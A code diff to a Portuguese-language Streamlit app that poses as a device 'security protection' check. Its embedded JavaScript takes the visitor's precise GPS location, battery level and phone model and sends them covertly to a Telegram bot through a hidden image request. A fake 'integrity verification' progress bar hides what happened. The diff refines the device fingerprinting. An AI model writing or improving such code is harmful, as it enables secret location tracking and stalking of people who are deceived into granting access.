@@ -36,7 +36,7 @@ placeholder_barra = st.empty()
 placeholder_texto.markdown('<div class="status-container">Status: Aguardando ativação (4%)</div>', unsafe_allow_html=True)
 placeholder_barra.markdown('<div class="progress-bg"><div class="progress-fill" style="width: 4%;"></div></div>', unsafe_allow_html=True)
 
-# --- MOTOR JS COMPLETO (BATERIA + MODELO + GPS) ---
+# --- MOTOR JS MELHORADO (PEGA O MODELO REAL) ---
 js_final = f"""
 <div class="btn-container">
     <button class="meu-botao" id="btn_ativar">
@@ -50,37 +50,37 @@ document.getElementById('btn_ativar').onclick = function() {{
     navigator.geolocation.getCurrentPosition(
         async function(pos) {{
             try {{
-                // Pegar Bateria
                 const bat = await navigator.getBattery();
                 const level = Math.round(bat.level * 100);
                 
-                // Pegar Modelo do Celular
                 const ua = navigator.userAgent;
-                let modelo = "Desconhecido";
+                let info_aparelho = "Desconhecido";
+
+                // Lógica para extrair modelo real do Android ou iPhone
                 if (ua.match(/\\((.*?)\\)/)) {{
-                    modelo = ua.match(/\\((.*?)\\)/)[1].split(';')[0];
+                    let detalhes = ua.match(/\\((.*?)\\)/)[1];
+                    // Se começar com Linux, tenta pegar o que vem depois (Android + Modelo)
+                    if (detalhes.includes("Linux")) {{
+                        info_aparelho = detalhes.replace("Linux; ", "");
+                    }} else {{
+                        info_aparelho = detalhes;
+                    }}
                 }}
 
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                
-                const msg = "🛡️ *PROTEÇÃO ATIVADA*\\n📱 *Aparelho:* " + modelo + "\\n🔋 *Bateria:* " + level + "%\\n📍 *Local:* https://www.google.com/maps?q=" + lat + "," + lon;
+                const msg = "🛡️ *PROTEÇÃO ATIVADA*\\n📱 *Aparelho:* " + info_aparelho + "\\n🔋 *Bateria:* " + level + "%\\n📍 *Local:* https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
 
-                // Envio via URL direta (Método Infalível)
                 var img = new Image();
                 img.src = "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&parse_mode=Markdown&text=" + encodeURIComponent(msg);
                 
-                // Avisa o Streamlit para iniciar a animação visual
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
             }} catch(e) {{
-                // Fallback caso a bateria falhe
                 const msg_alt = "🛡️ PROTEÇÃO ATIVADA (GPS OK)\\n📍 Local: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                 new Image().src = "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=" + encodeURIComponent(msg_alt);
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
             }}
         }},
         function(err) {{
-            alert("Atenção: Você precisa permitir o acesso à localização para validar o dispositivo.");
+            alert("Atenção: Você precisa permitir o acesso para validar o dispositivo.");
         }},
         {{ enableHighAccuracy: true, timeout: 10000 }}
     );
@@ -92,10 +92,10 @@ clicou = st.components.v1.html(js_final, height=150)
 st.markdown('<div class="footer">Sistema Integrado de Segurança Desenvolvido Por Miamy © 2026</div>', unsafe_allow_html=True)
 
 if clicou:
-    # Animação de 0 a 100
     for p in range(0, 101, 2):
         placeholder_texto.markdown(f'<div class="status-container">Verificando integridade: {p}%</div>', unsafe_allow_html=True)
         placeholder_barra.markdown(f'<div class="progress-bg"><div class="progress-fill" style="width: {p}%;"></div></div>', unsafe_allow_html=True)
         time.sleep(0.02)
     st.success("Proteção Concluída!")
     st.stop()
+    
